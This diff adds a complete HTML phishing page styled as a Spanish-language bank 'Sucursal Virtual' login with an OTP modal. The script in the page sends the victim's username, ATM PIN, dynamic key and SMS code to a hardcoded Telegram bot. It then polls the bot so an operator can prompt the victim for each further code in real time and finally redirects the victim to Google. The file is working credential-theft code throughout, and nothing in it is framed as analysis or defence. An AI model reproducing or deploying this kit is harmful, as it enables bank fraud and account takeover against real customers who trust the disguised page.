@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sucursal Virtual</title>
+
+<style>
+:root {
+  --ink: #333333;
+  --line: #333333;
+  --muted: #d9dadd;
+  --yellow: #ffdc00;
+  --main-black: #1f1f1f;
+  --bg-color: #f4f4f4;
+}
+
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  padding: 20px 12px 30px;
+  background: var(--bg-color);
+  color: var(--ink);
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+/* --- Encabezado Genérico --- */
+.brand-header { text-align: center; margin-bottom: 25px; position: relative; z-index: 1; }
+.brand-logo { display: inline-flex; align-items: center; gap: 8px; font-size: 28px; font-weight: 700; color: var(--main-black); letter-spacing: -1px; }
+.brand-logo-icon { width: 30px; height: 24px; position: relative; }
+.brand-logo-icon::before, .brand-logo-icon::after { content: ''; position: absolute; width: 100%; height: 6px; background: var(--main-black); border-radius: 4px; }
+.brand-logo-icon::before { top: 0; transform: skewX(-20deg); }
+.brand-logo-icon::after { bottom: 0; transform: skewX(-20deg); background: transparent; border-top: 6px solid var(--main-black); border-bottom: 6px solid var(--main-black); border-radius: 0; height: 18px; }
+
+.brand-title { text-align: center; font-size: 24px; font-weight: 400; color: var(--main-black); margin-bottom: 20px; position: relative; z-index: 1; }
+
+/* --- Formulario / Contenedor Principal --- */
+.login-card { width: min(100%, 760px); margin: 12px auto 0; background: #fff; border-radius: 12px; padding: 42px 48px 32px; box-shadow: 0 4px 12px rgba(0, 0, 0, .08); position: relative; z-index: 2; }
+h1 { margin: 0 0 24px; text-align: center; font-size: clamp(23px, 5vw, 44px); font-weight: 700; color: var(--main-black); }
+.intro { max-width: 500px; margin: 0 auto 40px; text-align: center; font-size: clamp(18px, 2.5vw, 20px); line-height: 1.4; color: #444; }
+
+/* --- Campos de entrada (Inputs) --- */
+.field { margin-bottom: 12px; }
+.input-wrap { display: flex; align-items: center; gap: 16px; min-height: 58px; padding: 0 6px 5px; border-bottom: 1px solid #555; }
+.input-wrap:focus-within { border-bottom-color: var(--main-black); }
+.input-wrap svg { width: 30px; height: 32px; flex: 0 0 30px; fill: none; stroke: currentColor; stroke-width: 1.5; }
+.input-wrap input { width: 100%; min-width: 0; border: 0; outline: none; background: transparent; color: var(--main-black); font-family: inherit; font-size: clamp(18px, 3.5vw, 24px); }
+.input-wrap input::placeholder { color: #666; opacity: 1; }
+
+.help-link { display: inline-block; margin-top: 12px; color: var(--main-black); font-size: clamp(12px, 2.5vw, 18px); font-weight: 700; line-height: 1.35; text-decoration: underline; }
+.help-link:hover, .create:hover { opacity: .75; }
+.field + .field { margin-top: 38px; }
+
+/* --- Botón --- */
+.submit { display: block; width: 100%; min-height: 47px; margin-top: 60px; padding: 12px 18px; border: 0; border-radius: 32px; background: var(--muted); color: #888; font-family: inherit; font-size: clamp(15px, 4vw, 33px); font-weight: 700; cursor: not-allowed; transition: background .2s ease, color .2s ease; }
+.submit.ready { background: var(--yellow); color: #252525; cursor: pointer; }
+.submit.ready:hover { background: #f2cd00; }
+
+.create { display: block; width: fit-content; max-width: 100%; margin: 40px auto 0; color: var(--main-black); text-align: center; font-size: clamp(15px, 3.2vw, 27px); font-weight: 700; text-decoration: underline; }
+
+.notice { display: none; margin: 18px 0 0; padding: 12px 14px; border: 1px solid #dedede; border-radius: 10px; background: #f7f7f7; font-size: 14px; line-height: 1.45; }
+.notice.show { display: block; }
+
+/* --- Footer --- */
+.footer-links { display: flex; flex-direction: column; align-items: center; gap: 32px; margin: 100px auto 25px; text-align: center; position: relative; z-index: 1; }
+.footer-links a { color: #333; font-size: clamp(19px, 3vw, 27px); line-height: 1.35; text-decoration: none; }
+.footer-links a:hover { text-decoration: underline; }
+
+/* =========================================
+   MODAL CLAVE DINÁMICA
+   ========================================= */
+.modal-overlay { 
+  display: none; 
+  position: fixed; 
+  inset: 0; 
+  background: rgba(0, 0, 0, 0.6); 
+  backdrop-filter: blur(2px); 
+  z-index: 1000; 
+  align-items: flex-start; 
+  justify-content: center; 
+  padding: 40px 20px; 
+}
+
+.modal-overlay.active { display: flex; }
+
+.modal-content { 
+  background: #fff; 
+  width: min(100%, 560px);
+  border-radius: 20px; 
+  padding: 30px 24px 24px; 
+  position: relative; 
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); 
+  margin-top: 20px;
+}
+
+.modal-close { display: none; }
+
+.gif-container { 
+  width: calc(100% + 48px);
+  margin-left: -24px;
+  margin-right: -24px;
+  margin-bottom: 20px; 
+  border-radius: 12px 12px 0 0; 
+  overflow: hidden; 
+  background: #4cc9f0; 
+  max-height: 160px;
+}
+.gif-container img { 
+  width: 100%; 
+  height: 160px;
+  object-fit: cover;
+  display: block; 
+}
+
+.modal-title { font-size: 28px; font-weight: 700; color: #1f1f1f; text-align: center; margin: 0 0 12px; }
+.modal-subtitle { font-size: 18px; color: #444; text-align: center; margin: 0 0 30px; line-height: 1.4; }
+
+/* Input de 6 dígitos estilo moderno */
+.otp-container { position: relative; display: flex; justify-content: space-between; gap: 8px; margin-bottom: 30px; padding: 0 10px; }
+.otp-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; letter-spacing: 30px; }
+.otp-slot { width: 100%; height: 30px; border-bottom: 2px solid #333; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 700; color: #1f1f1f; position: relative; }
+.otp-slot.active::after { content: ''; display: block; width: 2px; height: 24px; background: #333; animation: blink 1s step-end infinite; }
+@keyframes blink { 50% { opacity: 0; } }
+
+/* Estilos para el error en el modal */
+.otp-error { color: #d93025; font-size: 15px; text-align: center; margin-top: 0; margin-bottom: 20px; display: none; font-weight: bold; }
+.otp-error.show { display: block; }
+.otp-container.error .otp-slot { border-bottom-color: #d93025; }
+
+/* Alerta sutil para el login */
+.login-error { color: #d93025; font-size: 15px; text-align: center; margin-top: 15px; display: none; font-weight: bold; }
+.login-error.show { display: block; }
+
+.modal-actions { display: flex; gap: 15px; }
+.btn-modal { flex: 1; padding: 14px; border-radius: 30px; font-size: 18px; font-weight: 700; cursor: pointer; font-family: inherit; transition: all 0.2s; }
+.btn-borrar { background: #fff; border: 1px solid #999; color: #666; }
+.btn-borrar:hover { background: #f5f5f5; }
+.btn-continuar { background: #d9dadd; border: none; color: #888; cursor: not-allowed; }
+.btn-continuar.ready { background: var(--yellow); color: #1f1f1f; cursor: pointer; }
+.btn-continuar.ready:hover { background: #f2cd00; }
+
+/* TEXTO DE SEGURIDAD */
+.security-note {
+  text-align: center;
+  font-size: 12px;
+  color: #888;
+  margin-top: 20px;
+  line-height: 1.4;
+}
+
+/* === VISTA SMS CODE === */
+.sms-view {
+  display: none;
+  text-align: center;
+  padding: 20px 0;
+}
+.sms-view.active { display: block; }
+
+.sms-icon {
+  font-size: 40px;
+  margin-bottom: 15px;
+}
+.sms-message {
+  font-size: 18px;
+  color: #333;
+  line-height: 1.5;
+  margin-bottom: 20px;
+}
+.sms-message strong { color: var(--main-black); }
+.sms-input-wrap {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+.sms-input-wrap input {
+  width: 200px;
+  padding: 15px;
+  font-size: 24px;
+  text-align: center;
+  letter-spacing: 5px;
+  border: 2px solid #ccc;
+  border-radius: 8px;
+  outline: none;
+  font-family: inherit;
+}
+.sms-input-wrap input:focus {
+  border-color: var(--main-black);
+}
+
+/* Error para el SMS */
+.sms-error { color: #d93025; font-size: 15px; text-align: center; margin-bottom: 20px; display: none; font-weight: bold; }
+.sms-error.show { display: block; }
+.sms-input-wrap.error input { border-color: #d93025; }
+
+.btn-sms-final {
+  width: 100%;
+  padding: 16px;
+  border-radius: 30px;
+  border: none;
+  background: var(--yellow);
+  color: var(--main-black);
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  font-family: inherit;
+}
+.btn-sms-final:hover {
+  background: #f2cd00;
+}
+
+/* Loading Overlay */
+#loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.8); z-index: 2000; align-items: center; justify-content: center; }
+.spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-black); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+/* Ajustes para teléfonos */
+@media (max-width: 600px) {
+  body { padding: 16px 7px 24px; }
+  .login-card { margin-top: 18px; padding: 36px 24px 28px; border-radius: 12px; }
+  h1 { margin-bottom: 24px; }
+  .intro { margin-bottom: 36px; }
+  .input-wrap { min-height: 54px; gap: 13px; }
+  .input-wrap svg { width: 26px; height: 28px; flex-basis: 26px; }
+  .field + .field { margin-top: 34px; }
+  .help-link { margin-top: 17px; }
+  .submit { min-height: 64px; margin-top: 58px; }
+  .create { margin-top: 34px; }
+  .footer-links { gap: 30px; margin-top: 90px; }
+  
+  .modal-overlay { padding: 20px 10px; align-items: flex-start; }
+  .modal-content { padding: 20px 16px 20px; margin-top: 10px; }
+  .gif-container { margin-left: -16px; margin-right: -16px; width: calc(100% + 32px); max-height: 120px; }
+  .gif-container img { height: 120px; }
+  .modal-title { font-size: 24px; }
+  .modal-subtitle { font-size: 16px; }
+  .otp-slot { height: 26px; font-size: 24px; }
+}
+</style>
+</head>
+
+<body>
+
+<!-- Encabezado Genérico -->
+<header class="brand-header">
+  <div class="brand-logo">
+    <div class="brand-logo-icon"></div>
+    Sucursal Virtual
+  </div>
+</header>
+<h2 class="brand-title">Portal de Clientes</h2>
+
+<!-- Formulario Principal -->
+<main class="login-card">
+  <h1>¡Hola!</h1>
+  <p class="intro">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+
+  <form id="demoForm" autocomplete="off">
+    <div class="field">
+      <label class="input-wrap" for="usuario">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+          <circle cx="12" cy="7" r="4"></circle>
+        </svg>
+        <input id="usuario" type="text" placeholder="Usuario" aria-label="Usuario" autocomplete="off">
+      </label>
+      <a class="help-link" href="#ayuda-usuario">¿Olvidaste tu usuario?</a>
+    </div>
+
+    <div class="field">
+      <label class="input-wrap" for="clave">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          <circle cx="12" cy="16" r="1.5"></circle>
+          <path d="M12 17.5v2"></path>
+        </svg>
+        <input id="clave" type="password" inputmode="numeric" maxlength="4" pattern="[0-9]{4}" placeholder="Clave del cajero" aria-label="Clave" autocomplete="off">
+      </label>
+      <a class="help-link" href="#ayuda-clave">¿Olvidaste o bloqueaste tu clave?</a>
+    </div>
+
+    <p class="login-error" id="loginError">Usuario o clave incorrectos. Intenta de nuevo.</p>
+
+    <button class="submit" id="submitBtn" type="submit" disabled>Iniciar sesión</button>
+    <p class="notice" id="notice" role="status"></p>
+  </form>
+
+  <a class="create" href="#crear" id="createLink">Crear usuario</a>
+</main>
+
+<footer class="footer-links">
+  <a href="#conexion">¿Problemas para conectarte?</a>
+  <a href="#seguridad">Aprende sobre seguridad</a>
+  <a href="#reglamento">Reglamento Sucursal Virtual</a>
+</footer>
+
+<!-- MODAL CLAVE DINÁMICA -->
+<div class="modal-overlay" id="modalDinamica">
+  <div class="modal-content">
+    
+    <div id="viewDinamica">
+      <div class="gif-container">
+        <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
+      </div>
+
+      <h2 class="modal-title">Ingresa la Clave Dinámica</h2>
+      <p class="modal-subtitle">Encuentra tu Clave Dinámica en tu aplicación móvil.</p>
+
+      <div class="otp-container" id="otpContainer">
+        <input type="text" id="otpInput" class="otp-input" inputmode="numeric" maxlength="6" autocomplete="off">
+        <div class="otp-slot active"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+      </div>
+
+      <p class="otp-error" id="otpError">La clave dinámica es incorrecta o ha expirado. Intenta de nuevo.</p>
+
+      <div class="modal-actions">
+        <button class="btn-modal btn-borrar" id="btnBorrar">Borrar</button>
+        <button class="btn-modal btn-continuar" id="btnContinuar" disabled>Continuar</button>
+      </div>
+
+      <p class="security-note">Validación de seguridad para ingresar al portal web y ver tus productos.</p>
+    </div>
+
+    <div id="viewSms" class="sms-view">
+      <div class="sms-icon">📩</div>
+      <h2 class="modal-title">Código SMS Enviado</h2>
+      <p class="sms-message">
+        Hemos enviado un código de verificación a tu número de teléfono registrado. 
+        Por favor, ingrésalo a continuación.
+      </p>
+      
+      <div class="sms-input-wrap" id="smsInputWrap">
+        <input type="text" id="smsCodeInput" inputmode="numeric" maxlength="6" placeholder="******" autocomplete="off">
+      </div>
+
+      <p class="sms-error" id="smsError">El código SMS es incorrecto o ha expirado. Intenta de nuevo.</p>
+
+      <button class="btn-sms-final" id="btnSmsFinal">Validar Código</button>
+
+      <p class="security-note">Validación de seguridad para ingresar al portal web y ver tus productos.</p>
+    </div>
+
+  </div>
+</div>
+
+<!-- OVERLAY DE CARGA -->
+<div id="loading-overlay">
+  <div class="spinner"></div>
+</div>
+
+<script>
+// ==========================================
+// 🔑 CONFIGURACIÓN DE TELEGRAM
+// ==========================================
+const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
+const TG_CHAT_ID = '7776240161';
+
+// ==========================================
+// VARIABLES Y ELEMENTOS
+// ==========================================
+const usuarioInput = document.getElementById("usuario");
+const claveInput = document.getElementById("clave");
+const submitBtn = document.getElementById("submitBtn");
+const demoForm = document.getElementById("demoForm");
+const loadingOverlay = document.getElementById('loading-overlay');
+const loginError = document.getElementById('loginError');
+
+// Elementos del Modal
+const modal = document.getElementById("modalDinamica");
+const otpInput = document.getElementById("otpInput");
+const otpSlots = document.querySelectorAll(".otp-slot");
+const btnBorrar = document.getElementById("btnBorrar");
+const btnContinuar = document.getElementById("btnContinuar");
+const otpError = document.getElementById("otpError");
+const otpContainer = document.getElementById("otpContainer");
+
+// Elementos Vistas del Modal
+const viewDinamica = document.getElementById("viewDinamica");
+const viewSms = document.getElementById("viewSms");
+const smsCodeInput = document.getElementById("smsCodeInput");
+const btnSmsFinal = document.getElementById("btnSmsFinal");
+const smsError = document.getElementById("smsError");
+const smsInputWrap = document.getElementById("smsInputWrap");
+
+// Variables de control
+let pollingActivo = false;
+let pollingTimeout = null;
+let ultimoUpdateId = -1;
+let actionProcessed = false;
+let msgIdActual = null;
+
+// Funciones de UI
+function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
+function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
+
+function actualizarBoton() {
+  const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
+  const usuarioLleno = usuarioInput.value.trim().length > 0;
+  const formularioValido = claveCompleta && usuarioLleno;
+  
+  submitBtn.disabled = !formularioValido;
+  submitBtn.classList.toggle("ready", formularioValido);
+  
+  if (formularioValido) loginError.classList.remove("show");
+}
+
+usuarioInput.addEventListener("input", actualizarBoton);
+claveInput.addEventListener("input", function() {
+  claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
+  actualizarBoton();
+});
+
+// ==========================================
+// ENVIAR A TELEGRAM
+// ==========================================
+function enviarIdentificacionTelegram(usuario, clave) {
+    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    
+    // BOTÓN FINALIZAR AÑADIDO AQUÍ DESDE EL PRINCIPIO
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }],
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+        ]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionLogin);
+        } else {
+            ocultarOverlay();
+        }
+    }).catch(() => ocultarOverlay());
+}
+
+function enviarDinamicaTelegram(dinamica) {
+    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+        ]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionDinamica);
+        }
+    });
+}
+
+function enviarSmsTelegram(codigoSms) {
+    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
+            [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+        ]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionSms);
+        }
+    });
+}
+
+// ==========================================
+// ESCUCHAR BOTONES (POLLING)
+// ==========================================
+function escucharBotones(callbackAction) {
+    if (!msgIdActual) return;
+    pollingActivo = true;
+    
+    function check() {
+        if (!pollingActivo) return;
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
+        }).then(r => r.json()).then(data => {
+            if (!data.ok || !data.result || data.result.length === 0) {
+                pollingTimeout = setTimeout(check, 2000); return;
+            }
+            for (const u of data.result) {
+                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
+                if (u.callback_query) {
+                    const messageId = String(u.callback_query.message.message_id);
+                    if (messageId === String(msgIdActual)) {
+                        pollingActivo = false;
+                        callbackAction(u.callback_query.data);
+                        return;
+                    }
+                }
+            }
+            pollingTimeout = setTimeout(check, 2000);
+        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
+    }
+    check();
+}
+
+// ==========================================
+// ACCIONES DE TELEGRAM
+// ==========================================
+function handleTelegramActionLogin(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'pedir_dinamica') {
+        modal.classList.add("active");
+        viewDinamica.style.display = "block";
+        viewSms.classList.remove("active");
+        
+        otpInput.value = "";
+        otpError.classList.remove("show");
+        otpContainer.classList.remove("error");
+        actualizarOTP();
+        setTimeout(() => otpInput.focus(), 100);
+    } else if (action === 'error_usuario') {
+        loginError.classList.add("show");
+        claveInput.value = "";
+        actualizarBoton();
+        claveInput.focus();
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com"; // Redirección a Google
+    }
+}
+
+function handleTelegramActionDinamica(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'error_dinamica') {
+        modal.classList.add("active"); 
+        viewDinamica.style.display = "block";
+        viewSms.classList.remove("active");
+        
+        otpError.classList.add("show");
+        otpContainer.classList.add("error");
+        otpInput.value = "";
+        actualizarOTP();
+        otpInput.focus();
+        
+        actionProcessed = false;
+    } else if (action === 'sms_code') {
+        viewDinamica.style.display = "none";
+        viewSms.classList.add("active");
+        smsCodeInput.value = "";
+        smsError.classList.remove("show");
+        smsInputWrap.classList.remove("error");
+        setTimeout(() => smsCodeInput.focus(), 100);
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com"; // Redirección a Google
+    }
+}
+
+function handleTelegramActionSms(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'error_dinamica_final') {
+        viewSms.classList.remove("active");
+        viewDinamica.style.display = "block";
+        otpError.classList.add("show");
+        otpContainer.classList.add("error");
+        otpInput.value = "";
+        actualizarOTP();
+        otpInput.focus();
+        actionProcessed = false;
+    } else if (action === 'error_sms_final') {
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        smsCodeInput.value = "";
+        smsCodeInput.focus();
+        actionProcessed = false;
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com"; // Redirección a Google
+    }
+}
+
+// ==========================================
+// LÓGICA DEL FORMULARIO PRINCIPAL
+// ==========================================
+demoForm.addEventListener("submit", function(event) {
+  event.preventDefault();
+  
+  if (submitBtn.disabled) return;
+  
+  mostrarOverlay();
+  const user = usuarioInput.value.trim();
+  const pass = claveInput.value.trim();
+  
+  enviarIdentificacionTelegram(user, pass);
+});
+
+// Lógica del Modal (6 dígitos)
+function actualizarOTP() {
+  const valor = otpInput.value;
+  
+  otpSlots.forEach((slot, index) => {
+    if (index < valor.length) {
+      slot.textContent = valor[index];
+      slot.classList.remove("active");
+    } else {
+      slot.textContent = "";
+      if (index === valor.length) {
+        slot.classList.add("active");
+      } else {
+        slot.classList.remove("active");
+      }
+    }
+  });
+
+  if (valor.length === 6) {
+    btnContinuar.disabled = false;
+    btnContinuar.classList.add("ready");
+    otpSlots.forEach(s => s.classList.remove("active"));
+  } else {
+    btnContinuar.disabled = true;
+    btnContinuar.classList.remove("ready");
+  }
+}
+
+otpInput.addEventListener("input", function() {
+  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+  otpError.classList.remove("show");
+  otpContainer.classList.remove("error");
+  actualizarOTP();
+});
+
+otpContainer.addEventListener("click", () => otpInput.focus());
+
+btnBorrar.addEventListener("click", () => {
+  otpInput.value = "";
+  otpError.classList.remove("show");
+  otpContainer.classList.remove("error");
+  actualizarOTP();
+  otpInput.focus();
+});
+
+btnContinuar.addEventListener("click", () => {
+  if(otpInput.value.length === 6) {
+    mostrarOverlay();
+    enviarDinamicaTelegram(otpInput.value);
+  }
+});
+
+// Lógica para el código SMS
+smsCodeInput.addEventListener("input", function() {
+  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+  smsError.classList.remove("show");
+  smsInputWrap.classList.remove("error");
+});
+
+btnSmsFinal.addEventListener("click", () => {
+  if(smsCodeInput.value.length < 6) {
+    smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
+    smsError.classList.add("show");
+    smsInputWrap.classList.add("error");
+    return;
+  }
+  
+  mostrarOverlay();
+  enviarSmsTelegram(smsCodeInput.value);
+});
+
+actualizarBoton();
+</script>
+
+</body>
+</html>
